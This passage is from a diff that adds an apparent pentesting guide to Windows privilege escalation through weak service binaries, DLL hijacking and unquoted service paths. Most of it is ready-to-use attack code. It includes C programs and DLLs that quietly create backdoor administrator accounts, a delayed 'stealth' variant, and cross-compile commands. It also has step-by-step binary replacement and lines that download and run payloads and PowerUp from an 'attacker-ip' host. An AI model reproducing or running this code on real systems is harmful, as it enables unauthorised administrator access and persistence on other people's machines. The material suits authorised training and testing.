+    <span class="k">if</span> <span class="p">(</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe /c net user backdoor Password123! /add"</span><span class="p">,</span> 
+                     <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NO_WINDOW</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe /c net localgroup administrators backdoor /add"</span><span class="p">,</span> 
+                     <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NO_WINDOW</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="exploitation-process">Exploitation Process</h3>
+
+<p><strong>Step-by-step exploitation:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 1. Backup original binary</span><span class="w">
+</span><span class="n">copy</span><span class="w"> </span><span class="s2">"C:\vulnerable\service.exe"</span><span class="w"> </span><span class="s2">"C:\temp\service.exe.bak"</span><span class="w">
+
+</span><span class="c"># 2. Replace with malicious binary (using payload from section 2.1)</span><span class="w">
+</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://attacker-ip/adduser.exe</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">malicious.exe</span><span class="w">
+</span><span class="n">move</span><span class="w"> </span><span class="nx">malicious.exe</span><span class="w"> </span><span class="s2">"C:\vulnerable\service.exe"</span><span class="w">
+
+</span><span class="c"># 3. Restart service (if permissions allow)</span><span class="w">
+</span><span class="n">Restart-Service</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
+
+</span><span class="c"># 4. If no restart permissions, reboot (requires SeShutdownPrivilege)</span><span class="w">
+</span><span class="n">shutdown</span><span class="w"> </span><span class="nx">/r</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">0</span><span class="w">
+
+</span><span class="c"># 5. Verify privilege escalation (see section 1.2 for user enumeration commands)</span><span class="w">
+</span><span class="n">Get-LocalUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"backdoor"</span><span class="w">
+</span><span class="n">Get-LocalGroupMember</span><span class="w"> </span><span class="nx">Administrators</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*backdoor*"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="powerup-integration">PowerUp Integration</h3>
+
+<p><strong>Using PowerUp for automated detection:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Download and import PowerUp</span><span class="w">
+</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://attacker-ip/PowerUp.ps1'</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Find modifiable service files</span><span class="w">
+</span><span class="n">Get-ModifiableServiceFile</span><span class="w">
+
+</span><span class="c"># Use built-in abuse function</span><span class="w">
+</span><span class="n">Install-ServiceBinary</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'servicename'</span><span class="w">
+
+</span><span class="c"># Custom binary replacement</span><span class="w">
+</span><span class="n">Install-ServiceBinary</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'servicename'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\temp\malicious.exe'</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="22-dll-hijacking">2.2 DLL Hijacking</h2>
+
+<p>DLL hijacking exploits the Windows DLL search order to load malicious libraries instead of legitimate ones.</p>
+
+<h3 id="dll-search-order">DLL Search Order</h3>
+
+<p><strong>Standard search order (SafeDllSearchMode enabled):</strong></p>
+<ol>
+  <li>Application directory</li>
+  <li>System directory (<code class="language-plaintext highlighter-rouge">C:\Windows\System32</code>)</li>
+  <li>16-bit system directory</li>
+  <li>Windows directory (<code class="language-plaintext highlighter-rouge">C:\Windows</code>)</li>
+  <li>Current directory</li>
+  <li>PATH environment variable directories</li>
+</ol>
+
+<h3 id="dll-hijacking-types">DLL Hijacking Types</h3>
+
+<p><strong>Missing DLL Hijacking:</strong></p>
+<ul>
+  <li>Service attempts to load non-existent DLL</li>
+  <li>Place malicious DLL in search path</li>
+  <li>Gets loaded when service starts</li>
+</ul>
+
+<p><strong>DLL Replacement:</strong></p>
+<ul>
+  <li>Replace legitimate DLL with malicious version</li>
+  <li>Requires write permissions to DLL location</li>
+</ul>
+
+<h3 id="process-monitor-analysis">Process Monitor Analysis</h3>
+
+<p><strong>Using ProcMon for DLL analysis:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Filter for specific process</span><span class="w">
+</span><span class="c"># Process Name: contains "servicename"</span><span class="w">
+</span><span class="c"># Operation: is "CreateFile" or "Process and Thread Activity"</span><span class="w">
+</span><span class="c"># Path: contains ".dll"</span><span class="w">
+
+</span><span class="c"># Common ProcMon filters for DLL analysis:</span><span class="w">
+</span><span class="c"># - NAME NOT FOUND (missing DLLs)</span><span class="w">
+</span><span class="c"># - PATH NOT FOUND (incorrect paths)</span><span class="w">
+</span><span class="c"># - ACCESS DENIED (permission issues)</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="malicious-dll-creation">Malicious DLL Creation</h3>
+
+<p><strong>Standard DLL payloads:</strong></p>
+
+<p><em>Basic DLL template (C++):</em></p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+            <span class="c1">// Execute same payload as binary version (section 2.1)</span>
+            <span class="n">system</span><span class="p">(</span><span class="s">"net user dlluser Password123! /add"</span><span class="p">);</span>
+            <span class="n">system</span><span class="p">(</span><span class="s">"net localgroup administrators dlluser /add"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><em>Advanced stealth DLL:</em></p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">BackgroundTask</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpParam</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span> <span class="c1">// Wait 5 seconds</span>
+    
+    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)};</span>
+    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
+    <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_HIDE</span><span class="p">;</span>
+    
+    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe /c net user dlluser Password123! /add &amp;&amp; net localgroup administrators dlluser /add"</span><span class="p">,</span> 
+                 <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NO_WINDOW</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+            <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BackgroundTask</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><em>DLL compilation:</em></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Cross-compile on Kali (same process as binaries in section 2.1)</span>
+x86_64-w64-mingw32-gcc malicious.cpp <span class="nt">--shared</span> <span class="nt">-o</span> malicious.dll  <span class="c"># 64-bit</span>
+i686-w64-mingw32-gcc malicious.cpp <span class="nt">--shared</span> <span class="nt">-o</span> malicious32.dll  <span class="c"># 32-bit</span>
+</code></pre></div></div>
+
+<h3 id="dll-hijacking-detection">DLL Hijacking Detection</h3>
+
+<p><strong>Manual enumeration:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check application directory permissions</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"C:\Program Files\"</span><span class="w"> </span><span class="nt">-Directory</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$acl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="w">
+    </span><span class="nx">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$acl</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FileSystemRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Write|FullControl"</span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Writable directory: </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="si">)</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Search for missing DLLs in event logs</span><span class="w">
+</span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="nx">System</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Message</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*dll*"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">LevelDisplayName</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Error"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Automated tools:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PowerUp DLL hijacking checks</span><span class="w">
+</span><span class="n">Find-PathDLLHijack</span><span class="w">
+</span><span class="nx">Find-ProcessDLLHijack</span><span class="w">
+
+</span><span class="c"># WinPEAS DLL analysis</span><span class="w">
+</span><span class="o">.</span><span class="n">\winPEAS.exe</span><span class="w"> </span><span class="nx">quiet</span><span class="w"> </span><span class="nx">filesinfo</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="common-vulnerable-applications">Common Vulnerable Applications</h3>
+
+<p><strong>Known DLL hijacking targets:</strong></p>
+<ul>
+  <li>FileZilla (<code class="language-plaintext highlighter-rouge">TextShaping.dll</code>)</li>
+  <li>VLC Media Player</li>
+  <li>Custom enterprise applications</li>
+  <li>Third-party services</li>
+</ul>
+
+<h2 id="23-unquoted-service-paths">2.3 Unquoted Service Paths</h2>
+
+<p>Unquoted service paths exploit Windows’ CreateProcess function behavior when service paths contain spaces without quotes.</p>
+
+<h3 id="vulnerability-mechanics">Vulnerability Mechanics</h3>
+
+<p><strong>Path interpretation example:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Service Path: C:\Program Files\My App\My Service\service.exe
+
+Windows attempts to execute:
+1. C:\Program.exe
+2. C:\Program Files\My.exe  
+3. C:\Program Files\My App\My.exe
+4. C:\Program Files\My App\My Service\service.exe
+</code></pre></div></div>
+
+<h3 id="detection-methods">Detection Methods</h3>
+
+<p><strong>PowerShell enumeration:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get services with unquoted paths</span><span class="w">
+</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="bp">$null</span><span class="w"> </span><span class="o">-and</span><span class="w"> 
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s1">'C:\Windows\*'</span><span class="w"> </span><span class="o">-and</span><span class="w"> 
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'* *'</span><span class="w"> </span><span class="o">-and</span><span class="w"> 
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s1">'"*'</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="p">,</span><span class="w"> </span><span class="nx">State</span><span class="p">,</span><span class="w"> </span><span class="nx">StartMode</span><span class="w">
+
+</span><span class="c"># Alternative detection</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"* *"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s1">'"*'</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s2">"C:\Windows\*"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Command line detection:</strong></p>
+<pre><code class="language-cmd"># Using WMIC
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+
+# Using SC
+sc query | findstr "SERVICE_NAME\|BINARY_PATH_NAME"
+</code></pre>
+
+<p><strong>PowerUp detection:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Import PowerUp</span><span class="w">
+</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://attacker-ip/PowerUp.ps1'</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Find unquoted service paths</span><span class="w">
+</span><span class="n">Get-UnquotedService</span><span class="w">
+
+</span><span class="c"># Detailed analysis</span><span class="w">
+</span><span class="n">Get-ServiceUnquoted</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="permission-analysis-1">Permission Analysis</h3>
+
+<p><strong>Check directory write permissions:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test write access to potential hijack directories</span><span class="w">
+</span><span class="nv">$paths</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
+    </span><span class="s2">"C:\Program Files\"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"C:\Program Files\Application\"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"C:\Program Files\Application Name\"</span><span class="w">
+</span><span class="p">)</span><span class="w">
+
+</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$path</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$paths</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nv">$testFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="s2">"test.tmp"</span><span class="w">
+        </span><span class="s2">"test"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$testFile</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w">
+        </span><span class="n">Remove-Item</span><span class="w"> </span><span class="nv">$testFile</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+        </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Writable: </span><span class="nv">$path</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Not writable: </span><span class="nv">$path</span><span class="s2"> - </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Exception</span><span class="o">.</span><span class="nf">Message</span><span class="si">)</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Using icacls for detailed permissions</span><span class="w">
+</span><span class="n">icacls</span><span class="w"> </span><span class="s2">"C:\Program Files\Application\"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Users\|Everyone\|Authenticated Users"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="exploitation-process-1">Exploitation Process</h3>
+
+<p><strong>Manual exploitation:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 1. Identify vulnerable service</span><span class="w">
+</span><span class="n">Get-UnquotedService</span><span class="w">
+
+</span><span class="c"># 2. Create malicious executable (use payload from section 2.1)</span><span class="w">
+</span><span class="n">copy</span><span class="w"> </span><span class="nx">adduser.exe</span><span class="w"> </span><span class="s2">"C:\Program Files\Application\Program.exe"</span><span class="w">
+
+</span><span class="c"># 3. Start the service  </span><span class="w">
+</span><span class="n">Start-Service</span><span class="w"> </span><span class="nx">VulnerableService</span><span class="w">
+
+</span><span class="c"># 4. Verify exploitation (see section 1.2 for enumeration commands)</span><span class="w">
+</span><span class="n">Get-LocalUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"backdoor"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>PowerUp automation:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Automated exploitation</span><span class="w">
+</span><span class="n">Write-ServiceBinary</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'VulnerableService'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Program Files\Application\Program.exe"</span><span class="w">
+
+</span><span class="c"># Restart service</span><span class="w">
+</span><span class="n">Restart-Service</span><span class="w"> </span><span class="nx">VulnerableService</span><span class="w">
+
+</span><span class="c"># Custom payload (using standard user creation pattern from section 2.1)</span><span class="w">
+</span><span class="n">Write-ServiceBinary</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'VulnerableService'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\hijack\malicious.exe"</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"net user pwned Password123! /add &amp;&amp; net localgroup administrators pwned /add"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="service-control-verification">Service Control Verification</h3>
+
+<p><strong>Check service restart capabilities:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test if user can control service</span><span class="w">
+</span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">Stop-Service</span><span class="w"> </span><span class="nx">ServiceName</span><span class="w"> </span><span class="nt">-WhatIf</span><span class="w">
+    </span><span class="n">Start-Service</span><span class="w"> </span><span class="nx">ServiceName</span><span class="w"> </span><span class="nt">-WhatIf</span><span class="w">
+    </span><span class="s2">"User can control service"</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="s2">"Cannot control service: Requires administrative privileges or system reboot"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Check service configuration</span><span class="w">
+</span><span class="n">Get-Service</span><span class="w"> </span><span class="nx">ServiceName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Status</span><span class="p">,</span><span class="w"> </span><span class="nx">StartType</span><span class="w">
+</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"Name='ServiceName'"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">StartMode</span><span class="p">,</span><span class="w"> </span><span class="nx">State</span><span class="p">,</span><span class="w"> </span><span class="nx">StartName</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="advanced-exploitation-techniques">Advanced Exploitation Techniques</h3>
+
+<p><strong>Persistence through multiple paths:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Place executables in multiple potential paths</span><span class="w">
+</span><span class="nv">$maliciousExe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\temp\payload.exe"</span><span class="w">
+</span><span class="nv">$targetPaths</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
+    </span><span class="s2">"C:\Program.exe"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"C:\Program Files\Application.exe"</span><span class="p">,</span><span class="w"> 
+    </span><span class="s2">"C:\Program Files\Application Name\Service.exe"</span><span class="w">
+</span><span class="p">)</span><span class="w">
+
+</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$path</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$targetPaths</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="p">(</span><span class="n">Split-Path</span><span class="w"> </span><span class="nv">$path</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="n">Copy-Item</span><span class="w"> </span><span class="nv">$maliciousExe</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w">
+            </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Placed payload at: </span><span class="nv">$path</span><span class="s2">"</span><span class="w">
+        </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Failed to place at: </span><span class="nv">$path</span><span class="s2">"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
